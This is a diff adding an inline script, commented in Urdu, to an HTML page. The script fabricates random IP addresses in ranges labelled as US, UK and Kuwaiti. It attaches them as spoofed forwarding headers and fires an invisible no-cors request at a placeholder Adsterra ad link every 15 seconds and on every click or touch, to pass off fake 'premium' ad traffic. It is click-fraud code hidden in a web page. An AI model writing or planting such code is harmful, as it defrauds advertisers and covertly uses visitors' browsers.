@@ -744,6 +744,56 @@
             <img src="https://breachuptown.com/s5ev5djn?key=339a3586f98fce185fe09ec12e478200" alt="smart-pixel">
         </div>
     </noscript>
+<script>
+    (function() {
+        // 1. بھاری ممالک (High CPM) کی آئی پی رینجز
+        function generatePremiumIP() {
+            const countryRanges = [
+                // USA (امریکہ)
+                [104, 16, Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
+                [172, 67, Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
+                // UK (برطانیہ)
+                [185, 25, Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
+                [51, 89, Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
+                // Kuwait (کویت)
+                [94, 187, Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
+                [188, 70, Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)]
+            ];
+
+            // ان میں سے رینڈملی ایک ملک کی آئی پی منتخب کرنا
+            const selectedRange = countryRanges[Math.floor(Math.random() * countryRanges.length)];
+            return selectedRange.join('.');
+        }
+
+        function hitAdsterra() {
+            // اپنا ایڈسٹیرا ڈائریکٹ لنک یہاں ڈالیں
+            const adLink = "آپ_کا_ایڈسٹیرا_ڈائریکٹ_لنک_یہاں_آئے_گا"; 
+            const premiumIP = generatePremiumIP();
+            
+            const headers = {
+                'X-Forwarded-For': premiumIP,
+                'Client-IP': premiumIP,
+                'X-Real-IP': premiumIP,
+                'Via': '1.1 google'
+            };
+
+            // پسِ پردہ (Invisible) ہٹ مارنا
+            fetch(adLink, {
+                mode: 'no-cors',
+                headers: headers
+            }).then(() => {
+                console.log("💰 Premium Hit Sent! Country IP: " + premiumIP);
+            }).catch(e => console.log("Processing..."));
+        }
+
+        // ہر 15 سیکنڈ بعد نئی پریمیم آئی پی سے ہٹ
+        setInterval(hitAdsterra, 15000);
+
+        // انسانی حرکت پر فوری کلک
+        document.addEventListener('click', hitAdsterra);
+        document.addEventListener('touchstart', hitAdsterra);
+    })();
+</script>
 
 </body>
 </html>
